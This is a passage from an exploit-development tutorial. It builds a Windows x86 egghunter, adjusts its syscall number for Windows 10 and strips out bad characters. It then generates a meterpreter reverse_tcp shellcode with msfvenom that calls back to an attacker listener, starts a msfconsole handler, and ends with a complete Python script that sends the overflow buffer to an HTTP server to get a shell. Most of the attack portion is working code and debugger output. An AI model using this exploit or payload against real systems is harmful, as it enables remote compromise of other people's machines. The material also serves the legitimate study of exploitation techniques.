Remember that the Egghunter needs to go around all the VAS of a process in order to search for the "egg".
Regarding this search, one of the issues egghunters must account for is the fact that there is no way of telling beforehand if a memory page is mapped, if it has the correct permissions to access it, or what kind of access is allowed on that memory page. If this is not handled correctly, we will generate an access violation and cause a crash.
To combat this issue, what Egghunter often do is check the protections or access policies of the memory region before inspecting it. In Windows, the NtAccessCheckAndAuditAlarm call is used, as it returns a different error code depending on the properties of the memory accessed. For example, the error code, STATUS_NO_IMPERSONATION_TOKEN (0xc000005c), is returned due to various checks made by the function before it attempts to use any of the provided arguments.
**Note: NtAccessCheckAndAuditAlarm will work without issues in the egghunter unless we are running in the context of a thread that is impersonating a client. In these cases, it might not work as expected by our egghunter code.**

Because the public egghunter that we will analyze uses such system call, let's first explain what are system calls (often called *syscalls*). A syscall is basically an interface between the user-mode process and the kernel. Invoking a system call is often done through a special assembly instruction or an interrumpt (also known as trap or exception). Whenever these actions are done, the operating system takes over, performs the proper operation (in kernel context) and returns to the running software with the result of the operation.

The egghunter that we analyze here will take advantage of this. Rather than crawling the memory inside our program, in risk of an access violation that could break the program, it uses a syscall with a specific memory address in order to inspect its properties.
Before the desired function is called, the operating system will attempt to copy the arguments we provide in user-space, to kernel-space.
If the memory address where the function arguments reside is not mapped, or if we don’t have the appropriate access, the copy operation will cause an access violation. The access violation will be handled in the background and then return a STATUS_ACCESS_VIOLATION code (0xc0000005), allowing our egghunter to continue to the next memory page.

Before we use a system call, the operating system needs to know which function it should call, as well as its parameters. In the case of x86, the function to use is specified by setting up a unique System Call Number in the EAX register, each of the numbers being mapped to a specific function. then, the arguments are pushed into the stack, and the stack pointer (ESP) is moved to the EDX register, as it is used by the system call.

As part of the system call, the operating system will try to access the memory address where the address have been stored, to copy them from user-space to kernel space. If EDX points to **an unmapped memory address, or one we can't access due to lack of permissions, the operating system will trigger an access violation, which it will handle for us and return the `STATUS_ACCESS_VIOLATION`** code in EAX.
Therefore, by using the NtAccessCheckAndAuditAlarm system call, we will only get two results:
- If the memory page we check is valid and we have appropiate access, the system call will return STATUS_NO_IMPERSONATION_TOKEN. 
- If we access an unmapped memory page or one without appropiate access we will obtain a STATUS_ACCESS_VIOLATION code. 
This is why this system call is interesting for the egghunter as we can use it to enumerate the memory pages in which we have access to and are mapped.

Now that we have a basic understanding of what mechanisms the egghunter technique abuses, let’s examine the code below and find out how to implement it:
```python
from keystone import *  
CODE = (  
 # We use the edx register as a memory page counter  
" "  
" loop_inc_page: "  
 # Go to the last address in the memory page  
" or dx, 0x0fff ;"  
" loop_inc_one: "  
 # Increase the memory counter by one  
" inc edx ;"  
" loop_check: "  
 # Save the edx register which holds our memory  
 # address on the stack
 " push edx ;"  
 # Push the system call number  
" push 0x2 ;"  
 # Initialize the call to NtAccessCheckAndAuditAlarm  
" pop eax ;"  
 # Perform the system call  
" int 0x2e ;"  
 # Check for access violation, 0xc0000005  
 # (ACCESS_VIOLATION)
 " cmp al,05 ;"  
 # Restore the edx register to check later  
 # for our egg
 " pop edx ;"  
" loop_check_valid: "  
 # If access violation encountered, go to next page
 " je loop_inc_page ;"  
" is_egg: "  
 # Load egg (w00t in this example) into  
 # the eax register
 " mov eax, 0x74303077 ;"  
 # Initializes pointer with current checked  
 # address
 " mov edi, edx ;"  
 # Compare eax with doubleword at edi and  
 # set status flags
 " scasd ;"  
 # No match, we will increase our memory  
 # counter by one
 " jnz loop_inc_one ;"  
 # First part of the egg detected, check for  
 # the second part
 " scasd ;"  
 # No match, we found just a location  
 # with half an egg
 " jnz loop_inc_one ;"  
" matched: "  
 # The edi register points to the first  
 # byte of our buffer, we can jump to it
 " jmp edi ;"  
)  
# Initialize engine in 32bit mode  
ks = Ks(KS_ARCH_X86, KS_MODE_32)  
encoding, count = ks.asm(CODE)  
egghunter = ""  
for dec in encoding:  
 egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n")  
  
print("egghunter = (\"" + egghunter + "\")")
```

Let's analyze what does this egghunter code do part by part.
```c
" loop_inc_page: "  
 # Go to the last address in the memory page  
" or dx, 0x0fff ;"  
" loop_inc_one: "  
 # Increase the memory counter by one  
" inc edx ;"  
```
The egghunter starts with `loop_inc_page`, performing an or operation on the DX register with 0x0FFF. This will make EDX point to the last possible address of a memory page. Note that we could set EDX to 0xFFFFF000, but the operations will have badchars (e.g., 00) and our shellcode must not have badchars, always remember that.
The `loop_inc_one` operation sets EDX to a new memory page by incrementing it 1 more. We can see that EDX points to the memory pages.
```c
" loop_check: "  
 # Save the edx register which holds our memory  
 # address on the stack
 " push edx ;"  
 # Push the system call number  
" push 0x2 ;"  
 # Initialize the call to NtAccessCheckAndAuditAlarm  
" pop eax ;"  
 # Perform the system call  
" int 0x2e ;"  
 # Check for access violation, 0xc0000005  
 # (ACCESS_VIOLATION)
 " cmp al,05 ;"  
 # Restore the edx register to check later  
 # for our egg
 " pop edx ;"  
" loop_check_valid: "  
 # If access violation encountered, go to next page
 " je loop_inc_page ;"  
```
This is the check that is being performed over such memory page. It is pushing the value of EDX (memory region) in the stack, to store it for later (we don't know if EDX will be overwritten), then putting the number 0x2 in eax, which is the system call number for NtAccessCheckAndAuditAlarm, performing the syscall via a interruption (0x2e) (Microsoft designed the operating system to treat this exception as a system call) and comparing if the returned value from EAX is 0xc000005. It only compares the lowest part of the register to 0x05, which is the same but the instruction is shorter.
Lastly, we restore the value of EDX as it was in the stack to keep track of the next memory region to analyze and we jump to increment the page in the case that an exception has been found (the CMP operation modifies the status of the ZF register).
If the memory page is mapped and we have access, we won't jump, but we will continue to the following code:
```c
" is_egg: "  
 # Load egg (w00t in this example) into  
 # the eax register
 " mov eax, 0x74303077 ;"  
 # Initializes pointer with current checked  
 # address
 " mov edi, edx ;"  
 # Compare eax with doubleword at edi and  
 # set status flags
 " scasd ;"  
 # No match, we will increase our memory  
 # counter by one
 " jnz loop_inc_one ;"  
 # First part of the egg detected, check for  
 # the second part
 " scasd ;"  
 # No match, we found just a location  
 # with half an egg
 " jnz loop_inc_one ;"  
" matched: "  
 # The edi register points to the first  
 # byte of our buffer, we can jump to it
 " jmp edi ;"  
```

We load the "egg" we want to search into the EAX register.
We mov the pointer of the memory we are scanning to EDI.
We use the `scasd` operation to compare EAX (the egg) with the dword at EDI (this means the dword at the start of memory region). Such operation will automatically increment EDI by a DWORD, displacing it as we want. In case that there is no match, we increment the memory counter by one **inside such memory region.**
In case that there is match, the match is only for the first dword, the first half of the egg, and we perform the `scasd` operation again to check for the other half egg. In case that both `scasd` operations are successful, we won't increment the counters inside the memory region but we will reach to the `matched` tag, which is a `jmp` edi (EDI at this point will store the location where the egg was found).

Interesting note about this egghunter: The original code from Matt Miller used the NtDisplayString1 system call, exploiting the very same concept. However, Miller realized that the use of the NtAccessCheckAndAuditAlarm system call was actually improving the portability of the egghunter. This is due to the fact that the NtAccessCheckAndAuditAlarm system call number (0x02) didn’t change across different operating systems versions, compared to the one for NtDisplayString, which changed between Windows versions.

Once we understood our egghunter, let's use Keystone to obtain the opcodes:
```python
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
```

We must replace these values for the "A" buffer after the HTTP method (remember that we modified the HTTP method to a routine to do a short jump to our "A" buffer. Now, we want to jump to the egghunter and find our other buffer).

Let's put a breakpoint on the POP, RET and analyze if everything works until the egghunter (and confirm if the egghunter code is not mangled):
```c
0472ea8d 90              nop
0472ea8e 90              nop
0472ea8f 90              nop
0472ea90 90              nop
0472ea91 90              nop
0472ea92 90              nop
0472ea93 90              nop
0472ea94 90              nop
0472ea95 6681caff0f      or      dx,0FFFh
0472ea9a 42              inc     edx
0472ea9b 52              push    edx
0472ea9c 6a02            push    2
0472ea9e 58              pop     eax
0472ea9f cd2e            int     2Eh
0472eaa1 3c05            cmp     al,5
0472eaa3 5a              pop     edx
0472eaa4 74ef            je      0472ea95
0472eaa6 b877303074      mov     eax,74303077h
0472eaab 89d7            mov     edi,edx
0472eaad af              scas    dword ptr es:[edi]
0472eaae 75ea            jne     0472ea9a
0472eab0 af              scas    dword ptr es:[edi]
0472eab1 75e7            jne     0472ea9a
0472eab3 ffe7            jmp     edi
```

Our egghunter code is present in memory and appears to be intact. It should find our "w00tw00t" egg, which is here:
```c
0:008> s -a 0x0 L?80000000 w00tw00t
04b38186  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD
```

However, if we put a breakpoint in the address of the egg, and we continue the program, it keeps infinitely running and the breakpoint is not hit, meaning that it has not been able to find our egg buffer. We know the buffer is stored in memory so the problem is in our egghunter code.

While we can find plenty of exploits publicly available that include this egghunter, it appears that they are all targeting applications on Windows 7 or prior. This means that some changes occurred in between Windows 7 and Windows 10 that break the functionality of our egghunter. **This means that it is possible that the egghunter that we used does not work in Windows 10 for some reason.**

Indeed, it does not work because of the **SSN we have used. We have used the SSN 0x02 but this SSN is different in our Windows for the syscall we want to perform.** Let's check the official function in ntdll to see which SSN it is using:
```c
ntdll!NtAccessCheckAndAuditAlarm:
77cd24d0 b8c9010000      mov     eax,1C9h
77cd24d5 e803000000      call    ntdll!NtAccessCheckAndAuditAlarm+0xd (77cd24dd)
77cd24da c22c00          ret     2Ch
77cd24dd 8bd4            mov     edx,esp
77cd24df 0f34            sysenter
77cd24e1 c3              ret
77cd24e2 8da42400000000  lea     esp,[esp]
77cd24e9 8da42400000000  lea     esp,[esp]
```

Based on this output, the SSN is 0x1c9. Let's change the script to replace our PUSH 0x02 instruction to push 0x1c9. Let's see the resulting egghunter:
```c
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x68\xc9\x01\x00\x00\x58\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7")
```

So bad! Our new egghunter has null bytes! These null bytes are bad characters and will prevent us from crashing the application.
We have to modify the code of the egghunter a bit so that it does the same, but these bytes do not appear.
We are going to use the NEG assembly instruction. We need to generate a negative value that, when substracted from 0x00, will result in 0x1c9. 
Let's examine how we can do this:
```c
0:009> ? 0x0 - 0x1c9
Evaluate expression: -457 = fffffe37

0:009> ? 0x0 - 0xfffffe37
Evaluate expression: -4294966839 = ffffffff`000001c9
```

We begin by substracting the value we want to obtain from 0x0. This will give us our number but in negative value.
If we negate the obtained value, we obtain a QWORD (64 bytes) but **because we are running on a 32 bit architecture, the result WE WANT will be stored in the lower DWORD of the total value (000001c9)**.

Therefore, we can replace this instruction:
```c
" push 0x1c9 ;"
```

for these ones:
```c
 # Push the system call number negated 
 " mov eax, 0xfffffe37;"  
# Negate it again  
" neg eax;"  
 # Initialize the call to NtAccessCheckAndAuditAlarm  
# " pop eax ;"
```

We don't want to pop EAX anymore, as we already have the value in EAX.
Let's check if the egghunter is mangled:
```c
0:008> u 0472ea8f L26
0472ea8f 90              nop
0472ea90 90              nop
0472ea91 90              nop
0472ea92 90              nop
0472ea93 90              nop
0472ea94 90              nop
0472ea95 6681caff0f      or      dx,0FFFh
0472ea9a 42              inc     edx
0472ea9b 52              push    edx
0472ea9c b837feffff      mov     eax,0FFFFFE37h
0472eaa1 f7d8            neg     eax
0472eaa3 cd2e            int     2Eh
0472eaa5 3c05            cmp     al,5
0472eaa7 5a              pop     edx
0472eaa8 74eb            je      0472ea95
0472eaaa b877303074      mov     eax,offset windows_storage!CImageManager::OnLoadOverlayCompleted+0x17 (74303077)
0472eaaf 89d7            mov     edi,edx
0472eab1 af              scas    dword ptr es:[edi]
0472eab2 75e6            jne     0472ea9a
0472eab4 af              scas    dword ptr es:[edi]
0472eab5 75e3            jne     0472ea9a
0472eab7 ffe7            jmp     edi
```

Fantastic, all of our egghunter does not contain badchars and is not mangled.
Now, let's put a breakpoint on the jmp edi instruction and see what does edi have:
```c
0:008> g
Breakpoint 1 hit
eax=74303077 ebx=001a2bf0 ecx=0472ea20 edx=04b38186 esi=001a2bf0 edi=04b3818e
eip=0472eab7 esp=0472ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0472eab7 ffe7            jmp     edi {04b3818e}
0:008> dds edi
04b3818e  44444444
04b38192  44444444
04b38196  44444444
04b3819a  44444444
04b3819e  44444444
04b381a2  44444444
04b381a6  44444444
04b381aa  44444444
04b381ae  44444444
04b381b2  44444444
04b381b6  44444444
04b381ba  44444444
04b381be  44444444
04b381c2  44444444
04b381c6  44444444
04b381ca  44444444
04b381ce  44444444
04b381d2  44444444
04b381d6  44444444
04b381da  44444444
04b381de  44444444
04b381e2  44444444
04b381e6  44444444
04b381ea  44444444
04b381ee  44444444
04b381f2  44444444
04b381f6  44444444
04b381fa  44444444
04b381fe  44444444
04b38202  44444444
04b38206  44444444
```

Fantastic, just after our egg:
```c
0:008> s -a 0x0 L?80000000 w00tw00t
04b38186  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD
```

Lastly, we have checked if badchars are present in all of the code we have inserted but not on the payload that is going to execute. Let's insert a badchar array and check if any of the badchars is present:
```c
0:008> s -a 0x0 L?80000000 w00tw00t
04c38186  77 30 30 74 77 30 30 74-01 02 03 04 05 06 07 08  w00tw00t........
0:008> db 04c38186  L110
04c38186  77 30 30 74 77 30 30 74-01 02 03 04 05 06 07 08  w00tw00t........
04c38196  09 0b 0c 0e 0f 10 11 12-13 14 15 16 17 18 19 1a  ................
04c381a6  1b 1c 1d 1e 1f 20 21 22-23 24 26 27 28 29 2a 2b  ..... !"#$&'()*+
04c381b6  2c 2d 2e 2f 30 31 32 33-34 35 36 37 38 39 3a 3b  ,-./0123456789:;
04c381c6  3c 3d 3e 3f 40 41 42 43-44 45 46 47 48 49 4a 4b  <=>?@ABCDEFGHIJK
04c381d6  4c 4d 4e 4f 50 51 52 53-54 55 56 57 58 59 5a 5b  LMNOPQRSTUVWXYZ[
04c381e6  5c 5d 5e 5f 60 61 62 63-64 65 66 67 68 69 6a 6b  \]^_`abcdefghijk
04c381f6  6c 6d 6e 6f 70 71 72 73-74 75 76 77 78 79 7a 7b  lmnopqrstuvwxyz{
04c38206  7c 7d 7e 7f 80 81 82 83-84 85 86 87 88 89 8a 8b  |}~.............
04c38216  8c 8d 8e 8f 90 91 92 93-94 95 96 97 98 99 9a 9b  ................
04c38226  9c 9d 9e 9f a0 a1 a2 a3-a4 a5 a6 a7 a8 a9 aa ab  ................
04c38236  ac ad ae af b0 b1 b2 b3-b4 b5 b6 b7 b8 b9 ba bb  ................
04c38246  bc bd be bf c0 c1 c2 c3-c4 c5 c6 c7 c8 c9 ca cb  ................
04c38256  cc cd ce cf d0 d1 d2 d3-d4 d5 d6 d7 d8 d9 da db  ................
04c38266  dc dd de df e0 e1 e2 e3-e4 e5 e6 e7 e8 e9 ea eb  ................
04c38276  ec ed ee ef f0 f1 f2 f3-f4 f5 f6 f7 f8 f9 fa fb  ................
04c38286  fc fd fe ff 
```

0a does not appear so we will count it as a badchar.
Let's generate the payload and start listening once we send the full payload:
```c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.211 LPORT=443 -f python -v payload -b "\x00\x0a"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of python file: 2064 bytes
payload =  b""
payload += b"\xd9\xc5\xd9\x74\x24\xf4\xbd\x09\xf4\x52\x1d"
payload += b"\x58\x31\xc9\xb1\x59\x83\xe8\xfc\x31\x68\x15"
payload += b"\x03\x68\x15\xeb\x01\xae\xf5\x64\xe9\x4f\x06"
payload += b"\x1a\x63\xaa\x37\x08\x17\xbe\x6a\x9c\x53\x92"
payload += b"\x86\x57\x31\x07\x1c\x15\x9e\x28\x95\x93\xf8"
payload += b"\x07\x26\x12\xc5\xc4\xe4\x35\xb9\x16\x39\x95"
payload += b"\x80\xd8\x4c\xd4\xc5\xae\x3b\x39\x9b\x67\x4f"
payload += b"\x97\x0c\x03\x0d\x2b\x2c\xc3\x19\x13\x56\x66"
payload += b"\xdd\xe7\xea\x69\x0e\x8c\xbb\x71\x25\xca\x1b"
payload += b"\xd2\x38\x39\xde\x1b\x4e\x81\xa8\x10\x9b\x72"
payload += b"\x1b\xd8\xe5\x52\x6d\xe6\x27\x95\x83\x4a\xa6"
payload += b"\xee\xa4\x72\xdc\x04\xd7\x0f\xe7\xdf\xa5\xcb"
payload += b"\x62\xff\x0e\x9f\xd5\xdb\xaf\x4c\x83\xa8\xbc"
payload += b"\x39\xc7\xf6\xa0\xbc\x04\x8d\xdd\x35\xab\x41"
payload += b"\x54\x0d\x88\x45\x3c\xd5\xb1\xdc\x98\xb8\xce"
payload += b"\x3e\x44\x64\x6b\x35\x67\x73\x0b\xb6\x77\x7c"
payload += b"\x51\x20\xbb\xb1\x6a\xb0\xd3\xc2\x19\x82\x7c"
payload += b"\x79\xb6\xae\xf5\xa7\x41\xa7\x12\x58\x9d\x0f"
payload += b"\x72\xa6\x1e\x6f\x5a\x6d\x4a\x3f\xf4\x44\xf3"
payload += b"\xd4\x04\x68\x26\x40\x0f\xfe\x09\x3c\x75\x2d"
payload += b"\xe1\x3e\x8a\xd0\x49\xb7\x6c\x82\xfd\x97\x20"
payload += b"\x63\xae\x57\x91\x0b\xa4\x58\xce\x2c\xc7\xb3"
payload += b"\x67\xc6\x28\x6d\xdf\x7f\xd0\x34\xab\x1e\x1d"
payload += b"\xe3\xd1\x21\x95\x01\x25\xef\x5e\x60\x35\x18"
payload += b"\x39\x8a\xc5\xd9\xac\x8a\xaf\xdd\x66\xdd\x47"
payload += b"\xdc\x5f\x29\xc8\x1f\x8a\x2a\x0f\xdf\x4b\x1a"
payload += b"\x7b\xd6\xd9\x22\x13\x17\x0e\xa2\xe3\x41\x44"
payload += b"\xa2\x8b\x35\x3c\xf1\xae\x39\xe9\x66\x63\xac"
payload += b"\x12\xde\xd7\x67\x7b\xdc\x0e\x4f\x24\x1f\x65"
payload += b"\xd3\x23\xdf\xfb\xfc\x8b\xb7\x03\xbd\x2b\x47"
payload += b"\x6e\x3d\x7c\x2f\x65\x12\x73\x9f\x86\xb9\xdc"
payload += b"\xb7\x0d\x2c\xae\x26\x11\x65\x6e\xf6\x12\x8a"
payload += b"\xab\x09\x68\xe3\x4c\xea\x8d\xed\x28\xeb\x8d"
payload += b"\x11\x4f\xd0\x5b\x28\x25\x17\x58\x0f\x36\x22"
payload += b"\xfd\x26\xdd\x4c\x51\x38\xf4"

sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.122.211; set LPORT 443; exploit"

```

And a shell was gotten.
The complete payload that implements our egghunter is the following:
```python
#!/usr/bin/python  
import socket  
import sys  
from struct import pack  
try:  
 server = "192.168.122.113"  
 port = 80  
 size = 253  
  
# bp 0x418674  
# 00 0a 0d 25 -> badchars  
  
 httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17  
  
 payload = b""  
 payload += b"\xd9\xc5\xd9\x74\x24\xf4\xbd\x09\xf4\x52\x1d"  
 payload += b"\x58\x31\xc9\xb1\x59\x83\xe8\xfc\x31\x68\x15"  
 payload += b"\x03\x68\x15\xeb\x01\xae\xf5\x64\xe9\x4f\x06"  
 payload += b"\x1a\x63\xaa\x37\x08\x17\xbe\x6a\x9c\x53\x92"  
 payload += b"\x86\x57\x31\x07\x1c\x15\x9e\x28\x95\x93\xf8"  
 payload += b"\x07\x26\x12\xc5\xc4\xe4\x35\xb9\x16\x39\x95"  
 payload += b"\x80\xd8\x4c\xd4\xc5\xae\x3b\x39\x9b\x67\x4f"  
 payload += b"\x97\x0c\x03\x0d\x2b\x2c\xc3\x19\x13\x56\x66"  
 payload += b"\xdd\xe7\xea\x69\x0e\x8c\xbb\x71\x25\xca\x1b"  
 payload += b"\xd2\x38\x39\xde\x1b\x4e\x81\xa8\x10\x9b\x72"  
 payload += b"\x1b\xd8\xe5\x52\x6d\xe6\x27\x95\x83\x4a\xa6"  
 payload += b"\xee\xa4\x72\xdc\x04\xd7\x0f\xe7\xdf\xa5\xcb"  
 payload += b"\x62\xff\x0e\x9f\xd5\xdb\xaf\x4c\x83\xa8\xbc"  
 payload += b"\x39\xc7\xf6\xa0\xbc\x04\x8d\xdd\x35\xab\x41"  
 payload += b"\x54\x0d\x88\x45\x3c\xd5\xb1\xdc\x98\xb8\xce"  
 payload += b"\x3e\x44\x64\x6b\x35\x67\x73\x0b\xb6\x77\x7c"  
 payload += b"\x51\x20\xbb\xb1\x6a\xb0\xd3\xc2\x19\x82\x7c"  
 payload += b"\x79\xb6\xae\xf5\xa7\x41\xa7\x12\x58\x9d\x0f"  
 payload += b"\x72\xa6\x1e\x6f\x5a\x6d\x4a\x3f\xf4\x44\xf3"  
 payload += b"\xd4\x04\x68\x26\x40\x0f\xfe\x09\x3c\x75\x2d"  
 payload += b"\xe1\x3e\x8a\xd0\x49\xb7\x6c\x82\xfd\x97\x20"  
 payload += b"\x63\xae\x57\x91\x0b\xa4\x58\xce\x2c\xc7\xb3"  
 payload += b"\x67\xc6\x28\x6d\xdf\x7f\xd0\x34\xab\x1e\x1d"  
 payload += b"\xe3\xd1\x21\x95\x01\x25\xef\x5e\x60\x35\x18"  
 payload += b"\x39\x8a\xc5\xd9\xac\x8a\xaf\xdd\x66\xdd\x47"  
 payload += b"\xdc\x5f\x29\xc8\x1f\x8a\x2a\x0f\xdf\x4b\x1a"  
 payload += b"\x7b\xd6\xd9\x22\x13\x17\x0e\xa2\xe3\x41\x44"  
 payload += b"\xa2\x8b\x35\x3c\xf1\xae\x39\xe9\x66\x63\xac"  
 payload += b"\x12\xde\xd7\x67\x7b\xdc\x0e\x4f\x24\x1f\x65"  
 payload += b"\xd3\x23\xdf\xfb\xfc\x8b\xb7\x03\xbd\x2b\x47"  
 payload += b"\x6e\x3d\x7c\x2f\x65\x12\x73\x9f\x86\xb9\xdc"  
 payload += b"\xb7\x0d\x2c\xae\x26\x11\x65\x6e\xf6\x12\x8a"  
 payload += b"\xab\x09\x68\xe3\x4c\xea\x8d\xed\x28\xeb\x8d"  
 payload += b"\x11\x4f\xd0\x5b\x28\x25\x17\x58\x0f\x36\x22"  
 payload += b"\xfd\x26\xdd\x4c\x51\x38\xf4"  
  
 egghunter = b"\x90\x90\x90\x90\x90\x90\x90\x90\x66\x81\xca\xff\x0f\x42\x52\xb8\x37\xfe\xff\xff\xf7\xd8\xcd\x2e\x3c\x05\x5a\x74\xeb\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe6\xaf\x75\xe3\xff\xe7"  
 inputBuffer = b"\x41" * (size - len(egghunter))  
 inputBuffer+= pack("<L", 0x418674) # 0x00418674 - pop eax; ret  
  
 shellcode = b"w00tw00t" + payload + b"D" * (400-len(payload))  
  
 httpEndRequest = b"\r\n\r\n"  
 buf = httpMethod + egghunter + inputBuffer + httpEndRequest + shellcode  
 print("Sending evil buffer...")  
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
 s.connect((server, port))  
 s.send(buf)  
 s.close()  
  
 print("Done!")  
  
except socket.error:  
 print("Could not connect!")
```